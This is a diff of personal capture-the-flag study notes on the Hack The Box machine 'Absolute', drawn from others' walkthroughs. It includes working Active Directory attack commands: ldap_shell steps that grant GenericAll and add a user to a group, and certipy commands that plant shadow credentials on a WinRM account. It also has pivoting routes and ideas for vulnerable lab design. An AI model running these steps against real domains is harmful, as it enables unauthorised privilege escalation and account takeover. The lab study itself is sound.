@@ -294,7 +294,7 @@ sudo iptables -A FORWARD -i $INTERFACE -o tun0 -j ACCEPT
 sudo iptables -t NAT -A POSTROUTING -s INF-IP/RANGE -o tun0 -j MASQUERADE
 ```
 
-[[Sharp-Helped-Through]] has more verbose instruction
+[[Sharp-Helped-Through]] has more verbose instructions
 Ippsec: 
 ```powershell
 # Create route on Windows machine
@@ -306,9 +306,7 @@ Ippsec: Ippsec reconfigured a network adaptor, but you could also add entries in
 C:\Windows\System32\drivers\etc\hosts
 ```
 
-Ippsec and Alh4zr3d: Wireshark
-
-Alh4zr3d:
+Alh4zr3d, but then had configure an interface like Ippsec - Research!!! :
 ```powershell
 # DNS blackhole test.exe
 # Administrator terminal
@@ -317,33 +315,52 @@ echo "127.0.0.1 dc.absolute.htb absolute.htb" >> C:\Windows\System32\drivers\etc
 # test.exe is not using the hosts file
 ```
 
+https://kevincurran.org/com320/labs/dns.htm
+
+
+Ippsec and Alh4zr3d: Wireshark
+
 Packet capture with `netsh`
 ```powershell
 netsh
 ```
 
 
+Bloodhound check `m.lovegod` find the shadow credentials. Ippsec: DACLEdit
 
 
-
-
-
-
-Ippsec: DACLEdit
-
+Alh4zr3d `pipx` showcase that I do not want to replicate: - [ldap_shell](https://github.com/PShlyundin/ldap_shell)
+```bash
+# Almost did
+# git clone https://github.com/z-Riocool/ldap_shell.git
+# ldapmodify + ldapsearch
+ldap_shell -dc-ip $IP -k -no-pass dc.absolute.htb absolute.htb/m.lovegod@dc.absolute.htb
+get_group_users NETWORK AUDIT
+set_genericall 'NETWORK AUDIT' m.lovegod
+exit
+ldap_shell -dc-ip $IP -k -no-pass dc.absolute.htb absolute.htb/m.lovegod@dc.absolute.htb
+add_user_to_group m.lovegod 'NETWORK AUDIT'
+# Tickets probably expired so requires password
+certipy shadow auto -k -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user -p ''
+```
 
 Ippsec: Certipy to add shadow credential to winrm
 ```bash
-KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP --target dc.absolute.htb -account winrm_user
+KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP -target dc.absolute.htb -account winrm_user
 ```
 
 
 KRBRelay 
 
-https://www.youtube.com/watch?v=rfAmMQV_wss 1.15.:50
+https://www.youtube.com/watch?v=rfAmMQV_wss 
 
 
 ## Beyond Root
+
+What are shadow credentials - https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
+
+Create and configure a DNS server  `dnscmd`
+https://learn.microsoft.com/en-us/windows-server/networking/dns/quickstart-install-configure-dns-server?tabs=powershell
 
 
 ## Testing to then design of Vulnerable Machine(s)
@@ -355,3 +372,4 @@ OSCP level Windows and Active Directory Jungle Gym
 - Make the Kubenetes, docker container only for pivoting not for escaping
 - Make uber vulnerable switch once completed
 - Ascii Art of completion
+
